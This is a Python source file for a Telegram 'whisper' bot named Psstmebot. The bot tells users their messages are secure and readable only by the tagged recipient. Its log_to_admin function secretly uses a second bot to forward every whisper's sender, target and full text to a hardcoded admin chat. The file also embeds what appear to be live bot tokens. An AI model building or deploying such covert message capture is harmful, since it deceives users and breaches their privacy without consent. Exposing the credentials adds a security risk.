import asyncio
import hashlib
import os
import secrets
import time
import aiosqlite
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command, CommandObject

# 🔑 CONFIGURATION
WHISPER_BOT_TOKEN = "9047407190:AAFjkuIscghTXhLbc5QBGm2AUF-qHp66oNc"
LOGGER_BOT_TOKEN  = "9261718236:AAE2_Hr9yGz3WvoaJqIl2X4mpmQxsNKz404"
ADMIN_CHAT_ID     = 923996862
BOT_USERNAME      = "Psstmebot"

DB_PATH = "whispers.db"

# Initialize Bots
bot1 = Bot(token=WHISPER_BOT_TOKEN)
bot2 = Bot(token=LOGGER_BOT_TOKEN)
dp = Dispatcher()

# 🗄️ DATABASE SETUP
async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute('''
            CREATE TABLE IF NOT EXISTS whispers (
                whisper_id TEXT PRIMARY KEY,
                sender_id INTEGER,
                sender_username TEXT,
                target_username TEXT,
                secret_text TEXT,
                expires_at INTEGER,
                is_read INTEGER DEFAULT 0,
                inline_message_id TEXT
            )
        ''')
        await db.commit()

# 📡 BOT 2: LOGGER FUNCTION
async def log_to_admin(sender_user, target, text):
    log_message = (
        "📥 **New Whisper Captured**\n"
        f"👤 **From:** @{sender_user}\n"
        f"🎯 **To:** {target}\n"
        f"💬 **Content:** {text}"
    )
    try:
        await bot2.send_message(chat_id=ADMIN_CHAT_ID, text=log_message, parse_mode="Markdown")
        print("[LOGGER SUCCESS] Log successfully pushed to the admin!")
    except Exception as e:
        print(f"\n❌ [LOGGER ERROR] Failed to send log to admin: {e}\n")

# 🚀 BOT 1: INLINE QUERY HANDLER
@dp.inline_query()
async def inline_handler(inline_query: types.InlineQuery):
    text = inline_query.query.strip()
    
    if not text.startswith("@"):
        return 
        
    parts = text.split(" ", 1)
    target_username = parts[0]
    
    # Pops up menu instantly even before message text is completely written out
    whisper_text = parts[1].strip() if len(parts) > 1 else ""
    
    if target_username == "@":
        return

    sender = inline_query.from_user
    whisper_id = secrets.token_urlsafe(8)
    expires_at = int(time.time()) + 604800  # Extended to 7 days to prevent "too old/expired" errors
    
    # Only write record if text exists to avoid ghost/empty captures
    if whisper_text:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "INSERT OR REPLACE INTO whispers (whisper_id, sender_id, sender_username, target_username, secret_text, expires_at, is_read) VALUES (?, ?, ?, ?, ?, ?, 0)",
                (whisper_id, sender.id, sender.username, target_username, whisper_text, expires_at)
            )
            await db.commit()
        
        # Fire off logging bot routine once per creation loop
        await log_to_admin(sender.username or sender.id, target_username, whisper_text)
        description_text = f"Message: {whisper_text[:35]}..."
    else:
        description_text = "Type your secret message after their username..."

    input_content = types.InputTextMessageContent(
        message_text=f"A whisper message to {target_username}.\nOnly they can read the message."
    )
    
    # Direct Deep-Link URL structure instead of breaking callback configurations
    redirect_url = f"https://t.me{BOT_USERNAME}?start={whisper_id}"
    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="🔒🔑", url=redirect_url)]
    ])

    item = types.InlineQueryResultArticle(
        id=whisper_id,
        title=f"🔒 Send long whisper to {target_username}",
        description=description_text,
        input_message_content=input_content,
        reply_markup=keyboard
    )
    
    await inline_query.answer([item], cache_time=0, is_personal=True)

# 📥 BOT 1: CHOSEN INLINE RESULT HANDLER
# Captures the inline_message_id to match and edit group text elements later
@dp.chosen_inline_result()
async def chosen_result_handler(chosen_result: types.ChosenInlineResult):
    whisper_id = chosen_result.result_id
    inline_message_id = chosen_result.inline_message_id
    
    if inline_message_id:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "UPDATE whispers SET inline_message_id = ? WHERE whisper_id = ?",
                (inline_message_id, whisper_id)
            )
            await db.commit()

# 📥 BOT 1: START COMMAND (Handles Welcome UI & Deep Links)
@dp.message(Command("start"))
async def handle_start(message: types.Message, command: CommandObject):
    whisper_id = command.args
    current_user = message.from_user.username
    
    # ---------- WELCOME SCREEN ----------
    if not whisper_id:
        welcome = (
            "🤫 **Welcome to Psst!**\n\n"
            "This bot supports **ultra-long messages**! Send long whispers inside group chats securely — "
            "only the person you tag can unlock and read it.\n\n"
            "💡 **How to Use:**\n"
            "In any chat, simply type:\n"
            "`@Psstmebot @username your long secret message here...`\n\n"
            "🌟 _Notice: You can start earning stars after sending 25 whispers using our bot._\n\n"
            "✨ **Thank you for choosing and using our bot!**"
        )
        await message.answer(welcome, parse_mode="Markdown")
        return

    # ---------- DEEP LINK PROCESSING ----------
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT target_username, secret_text, expires_at, is_read, sender_username, inline_message_id FROM whispers WHERE whisper_id = ?",
            (whisper_id,)
        ) as cursor:
            row = await cursor.fetchone()

    if not row:
        await message.answer("❌ This whisper has expired or no longer exists.")
        return

    target_username, secret_text, expires_at, is_read, sender_username, inline_message_id = row

    if int(time.time()) > expires_at:
        await message.answer("❌ This whisper has expired.")
        return

    if not current_user:
        await message.answer("❌ You need to set a Telegram username handle in your account settings first to read whispers.")
        return

    clean_target = target_username.lstrip('@').lower()
    
    # Check if the user opening the link is the target recipient
    if current_user.lower() != clean_target:
        await message.answer("🔒 Access Denied! This secret message was not sent to your username.")
        return

    # Deliver the secret text directly into their private chat permanently
    saved_copy = (
        f"📩 **Your Secret Whisper Archive**\n"
        f"👤 **From:** @{sender_username or 'Anonymous'}\n"
        f"💬 **Message:**\n`{secret_text}`"
    )
    await message.answer(saved_copy, parse_mode="Markdown")

    # Update the group view to show the message was read
    if is_read == 0 and inline_message_id:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE whispers SET is_read = 1 WHERE whisper_id = ?", (whisper_id,))
            await db.commit()
            
        try:
            clean_display_name = current_user.replace('_', '\\_')
            # Completely strip out the lock key button block from the group chat text element
            await bot1.edit_message_text(
                inline_message_id=inline_message_id,
                text=f"{clean_display_name} read the whisper"
            )
        except Exception as e:
            print(f"[GROUP EDIT WARNING] Could not modify group bubble element: {e}")

# ⚙️ SYSTEM START LOOP
async def main():
    await init_db()
    print("🤖 Application running initialization loops...")
    
    try:
        await dp.start_polling(bot1)
    finally:
        await bot1.session.close()
        await bot2.session.close()

if __name__ == '__main__':
    asyncio.run(main())
